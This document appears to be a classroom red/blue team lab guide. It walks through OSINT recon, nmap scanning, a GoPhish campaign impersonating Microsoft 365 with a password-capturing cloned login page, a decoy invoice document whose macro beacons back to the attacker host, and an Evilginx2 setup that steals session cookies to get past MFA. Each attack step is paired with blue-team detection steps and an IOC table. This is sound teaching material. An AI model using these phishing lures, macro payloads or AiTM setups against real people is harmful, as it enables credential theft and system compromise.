# Lesson 1 — Reconnaissance, Initial Access & Phishing
## Hands-On Lab

```
Kali (attacker)   $KALI_IP  ← set this once, used everywhere below
Windows (victim)  find with: ipconfig → IPv4 Address
Lab domain        redlab.local  →  $KALI_IP
```

**Set your IP once at the start of every session — all commands use `$KALI_IP`:**
```bash
source config.sh          # auto-detects your IP
echo $KALI_IP             # verify it looks right
```
If auto-detection picks the wrong interface, open `config.sh` and set `KALI_IP` manually.

---

## Pre-Lab — Setup

```bash
# Clone the repo onto Kali
git clone https://github.com/<your-org>/red4blue.git
cd red4blue/lesson1

# Run the one-time setup script
sudo bash setup/setup_lab.sh
```

The script installs: `httrack  theharvester  golang  evilginx2  python-docx  aiosmtpd`

```bash
# Verify nmap and gophish are present
nmap --version
gophish --version
```

**Windows victim — add to hosts file (run Notepad as Administrator):**
```
C:\Windows\System32\drivers\etc\hosts

$KALI_IP  redlab.local
```

Open **4 terminals** on Kali now — each module below says which terminal to use.

---

## Phase 1 — Passive Recon (OSINT)

> No packets touch the victim. Zero logs generated on their side.
>
> Replace `<TARGET>` with a domain you have permission to test,
> or use a real company's public data for classroom demo (whois/DNS are public record).

**Terminal 1**

```bash
# Set the target domain once — used in all commands below
TARGET=<TARGET>        # e.g. tesla.com for a live demo, or your own domain
```

```bash
# 1a. Who registered the domain? When? What name servers?
whois $TARGET
```

```bash
# 1b. DNS records — MX reveals mail provider, TXT reveals SPF (tells us email infra)
host -t MX  $TARGET
host -t TXT $TARGET
host -t NS  $TARGET
```

```bash
# 1c. Certificate transparency — every SSL cert is logged publicly
#     This leaks subdomains even if not in DNS
curl -s "https://crt.sh/?q=%25.$TARGET&output=json" \
  | python3 -c "
import json,sys
d=json.load(sys.stdin)
names={n for e in d for n in e.get('name_value','').split('\n') if n}
[print(n) for n in sorted(names)[:20]]
"
```

```bash
# 1d. theHarvester — emails + subdomains from public search engines
theHarvester -d $TARGET -b bing,crtsh -l 50
```

**Google Dorks — open in browser (show students on projector):**
```
site:<TARGET> filetype:pdf
site:<TARGET> inurl:login OR inurl:admin
site:linkedin.com/in "<company name>"
"@<TARGET>" site:pastebin.com
```

**Shodan — paste in browser:**
```
https://www.shodan.io/search?query=hostname%3A<TARGET>
https://www.shodan.io/search?query=org%3A%22<Company+Name>%22+port%3A3389
```

> **Blue team:** passive recon is invisible — the only defence is minimising public exposure
> (LinkedIn scrubbing, private WHOIS, monitoring crt.sh for rogue certs).

---

## Phase 2 — Active Recon (Network Scanning)

> **Blue team:** start Wireshark now → filter `ip.src == $KALI_IP`

**Terminal 1**

```bash
# Set the victim IP (run ipconfig on Windows to find it)
VICTIM=192.168.11.XXX
```

```bash
# 2a. Ping sweep — discover live hosts on the subnet
nmap -sn 192.168.11.0/24
```

```bash
# 2b. Fast port scan — what services are running?
nmap -sV -T4 --open $VICTIM
```

```bash
# 2c. OS detection + default scripts
sudo nmap -O -sV -sC $VICTIM
```

```bash
# 2d. Windows-specific ports
nmap -sV -p 80,443,135,139,445,3389,5985,8080 $VICTIM
```

```bash
# 2e. Aggressive scan — intentionally noisy, triggers IDS
sudo nmap -A -T4 $VICTIM
```

> **Blue team — what you see in Wireshark:**
> - Burst of SYN packets to many ports from the same source IP
> - ICMP echo requests across the whole subnet
> - Unusual TCP options (nmap OS fingerprinting probes)
>
> **Blue team — enable Windows Firewall logging (run on victim as Administrator):**
> ```powershell
> # Turn firewall on first
> netsh advfirewall set allprofiles state on
>
> # Enable drop logging
> netsh advfirewall set allprofiles logging droppedconnections enable
> netsh advfirewall set allprofiles logging filename C:\fw.log
> ```
> Now run the nmap scans from Kali, then check the log:
> ```powershell
> Get-Content C:\fw.log | Select-String "192.168.11.149"
> ```
> After the demo, turn the firewall back off:
> ```powershell
> netsh advfirewall set allprofiles state off
> ```

---

## Phase 3 — Start Attack Infrastructure

Start these in three separate terminals and leave them running for the rest of the lesson.

**Terminal 1 — GoPhish**
```bash
sudo gophish
# Dashboard → https://127.0.0.1:3333
# Login:  admin / kali-gophish   (change password on first login)
```

**Terminal 2 — SMTP relay (captures emails GoPhish sends)**
```bash
python3 tools/smtp_server.py
# Listens on 127.0.0.1:1025
```

**Terminal 3 — Payload HTTP server**
```bash
python3 tools/http_server.py
# Listens on 0.0.0.0:8080
# Fake login page → http://$KALI_IP:8080/
```

---

## Phase 4 — Phishing Campaign (GoPhish)

Open **https://127.0.0.1:3333** in your browser. Follow these steps.

### 4-A · Sending Profile

```
Sending Profiles → New Profile

  Name:         Lab SMTP Relay
  From:         noreply@microsoft-support.com
  Host:         127.0.0.1
  Port:         1025
  Username:     (leave blank)
  Password:     (leave blank)
  TLS:          unchecked
  Ignore Errors: checked

→ Save Profile
```

Test: click **Send Test Email** and enter your own address — watch Terminal 2 log it.

### 4-B · Landing Page

```
Landing Pages → New Page

  Name:   Microsoft Login Clone

  Option A — import live:
    Import Site → http://$KALI_IP:8080/
    (pulls templates/fake_login.html from our server)

  Option B — paste HTML:
    HTML tab → paste content of templates/fake_login.html

  ✓  Capture Submitted Data
  ✓  Capture Passwords
  Redirect To:  https://login.microsoftonline.com

→ Save Page
```

### 4-C · Email Template

```
Email Templates → New Template

  Name:            MS Alert
  Envelope Sender: noreply@microsoft-support.com
  Subject:         [ACTION REQUIRED] Unusual sign-in activity detected

  Text tab (required — paste this):
    Microsoft 365 Security Alert - Please verify your account at {{.URL}}

  ✓  Add Tracking Image

→ Save Template
```

> GoPhish's HTML editor corrupts template variables. Use the Text tab — it works reliably and the phishing link still reaches the victim.

### 4-D · Users & Groups

```
Users & Groups → New Group

  Name: Lab Victims
  Add Target:
    First:    Victim
    Last:     User
    Email:    <Windows user email or any real inbox you control>
    Position: IT Manager

→ Save Changes
```

### 4-E · Launch Campaign

```
Campaigns → New Campaign

  Name:            Lesson1-Phishing
  Email Template:  Microsoft 365 Security Alert
  Landing Page:    Microsoft Login Clone
  URL:             http://$KALI_IP:8080
  Launch Date:     (now)
  Sending Profile: Lab SMTP Relay
  Groups:          Lab Victims

→ Launch Campaign
```

### 4-F · Watch results roll in

```
Dashboard → click campaign name

Live stats:
  Email Sent         ● appears immediately
  Email Opened       ● victim opens email (tracking pixel)
  Clicked Link       ● victim clicks the button
  Submitted Data     ● credentials captured!

Click "Submitted Data" to view: username · password
```

> **Blue team — email header analysis (open the phishing email on Windows):**
> ```
> View: File → Properties → Internet Headers (Outlook)
>
> Check:
>   From:         noreply@microsoft-support.com  ← NOT microsoft.com
>   Return-Path:  same spoofed domain
>   Received:     shows $KALI_IP (our Kali) as origin
>   Authentication-Results: spf=none  dkim=none  dmarc=none
> ```

---

## Phase 5 — Fake Login Page / Site Cloning

**Terminal 4**

```bash
# Method A — wget: grab a single login page and rewrite links
wget -q --page-requisites --convert-links \
     --directory-prefix=/tmp/clone \
     "http://testphp.vulnweb.com/login.php"

ls /tmp/clone/
```

```bash
# Method B — httrack: full recursive clone (better fidelity)
httrack "http://testphp.vulnweb.com/login.php" \
    -O /tmp/clone_full -%v --depth=1 --robots=0
```

```bash
# Serve the clone on port 9090 for comparison
cd /tmp/clone && python3 -m http.server 9090
# Victim visits: http://$KALI_IP:9090/
```

Show students side-by-side: real site vs cloned — they look identical.

> **Blue team red flags:**
> - Address bar URL ≠ real domain
> - No padlock / SSL cert not issued to the real company
> - Browser password manager does not autofill (domain mismatch)

---

## Phase 6 — Payload Delivery

**Attacker — Terminal 4 (Kali)**

Generate the macro code and decoy document:
```bash
python3 tools/create_macro_doc.py
# Creates: payloads/invoice_Q4_2024.docx   (decoy shell)
#          payloads/macro_code.vba          (VBA to embed)
```

Review what the macro does — walk through it with students:
```bash
cat payloads/macro_code.vba
```
Three things happen the moment the victim clicks "Enable Content":
1. `calc.exe` opens — proof the macro ran
2. `macro_ran.txt` is written to `%TEMP%` — artifact on disk
3. A PowerShell one-liner silently beacons back to Kali

**Embed the macro in LibreOffice (Terminal 4):**
```bash
libreoffice --writer payloads/invoice_Q4_2024.docx
```
Inside LibreOffice:
1. Tools → Macros → Edit Macros
2. Paste the full content of `payloads/macro_code.vba` into Module1
3. File → Save As → `invoice_Q4_2024.docm` (macro-enabled format)
4. Close LibreOffice

The `.docm` is now in `payloads/` — http_server.py is already serving it.

**Victim — download and open on Windows:**
```powershell
Invoke-WebRequest -Uri "http://<Kali IP>:8080/payloads/invoice_Q4_2024.docm" `
                  -OutFile "$env:TEMP\invoice_Q4_2024.docm"
Invoke-Item "$env:TEMP\invoice_Q4_2024.docm"
```

1. Word opens — click **Enable Content** when prompted
2. Calculator opens — macro executed
3. A confirmation dialog appears
4. The macro silently beacons back to Kali in the background

---

## Phase 7 — Beacon Arrives on Kali

Watch **Terminal 3** (http_server.py). Within seconds of the victim clicking "Enable Content":

```
  [!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!]
  [BEACON] 14:32:01 from 192.168.11.1
    macro=1  host=VICTIM-PC  user=Administrator
  [!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!]
```

The macro fired, calc.exe opened, and the victim's machine called home — all from one click.

---

## Phase 8 — Blue Team Investigation

Students switch roles. All commands run **on Windows.**

### Find the artifact the macro left behind
```powershell
Get-ChildItem $env:TEMP | Sort-Object LastWriteTime -Descending | Select -First 10
Get-Content "$env:TEMP\macro_ran.txt"
```

### Find the connection back to Kali
```powershell
# Replace <Kali IP> with the actual Kali IP
netstat -ano | findstr "<Kali IP>"
```

### Check firewall log for the port scan
```powershell
Get-Content "C:\fw.log" | Select-String "DROP" | Select -Last 20
```

### Block the attacker
```powershell
# Add an outbound block for Kali's IP
New-NetFirewallRule -DisplayName "Block Kali" `
    -Direction Outbound -RemoteAddress "<Kali IP>" -Action Block
```

### Clean up after the lesson
```powershell
Remove-NetFirewallRule -DisplayName "Block Kali"
netsh advfirewall set allprofiles state off
```

> **What the evidence tells us:**
> - Firewall log (`C:\fw.log`) → port scan happened — recon leaves traces even through NAT
> - `macro_ran.txt` in `%TEMP%` → macro executed — forensic proof of the infection
> - `netstat` connection to Kali → active beacon — machine was phoning home
> - Root cause: victim clicked "Enable Content" on an untrusted document

### Review what GoPhish captured (back on Kali — Terminal 1)
```bash
cat captured_credentials.log   # credentials from fake login page
cat smtp_captured.log           # emails captured by SMTP relay
```

---

## Evilginx2 — AiTM Demo  *(bonus if time allows)*

Evilginx2 proxies the REAL site — victim sees no fake page but
we capture credentials **and** session cookies (bypasses MFA).

```bash
# Start evilginx (developer mode — no real domain needed)
sudo evilginx -developer -p /opt/evilginx2/phishlets/
```

```
# Inside evilginx console
config domain redlab.local
config ip $KALI_IP
phishlets hostname o365 redlab.local
phishlets enable o365
lures create o365
lures get-url 0
```

Send the lure URL to the victim. After they log in:
```
sessions        # list captured sessions
sessions 1      # show credentials + session cookies
```

See `lesson1/setup/evilginx_notes.md` for full phishlet setup.

---

## Quick Reference

| What | Command |
|------|---------|
| GoPhish dashboard | `https://127.0.0.1:3333` · `admin` / `kali-gophish` |
| Start SMTP relay | `python3 tools/smtp_server.py` |
| Start HTTP server | `python3 tools/http_server.py` |
| Fake login page | `http://$KALI_IP:8080/` |
| Macro doc (after embedding) | `http://$KALI_IP:8080/payloads/invoice_Q4_2024.docm` |
| Captured credentials | `cat captured_credentials.log` |
| Ping sweep | `nmap -sn 192.168.11.0/24` |
| Fast port scan | `nmap -sV -T4 --open $VICTIM` |
| Aggressive scan | `sudo nmap -A -T4 $VICTIM` |

---

## IOC Cheatsheet

| Indicator | Type | Where to look |
|-----------|------|---------------|
| Rapid SYN packets from Kali IP | Network | Wireshark on VMnet8 / `C:\fw.log` |
| Email from `*-support.com` not `microsoft.com` | Email header | SPF/DKIM=none in headers |
| `WINWORD.EXE` → `cmd.exe` → `calc.exe` | Process | Task Manager during macro |
| `%TEMP%\macro_ran.txt` | File | `Get-ChildItem $env:TEMP` |
| Outbound HTTP to Kali `:8080` | Network | `netstat -ano` |
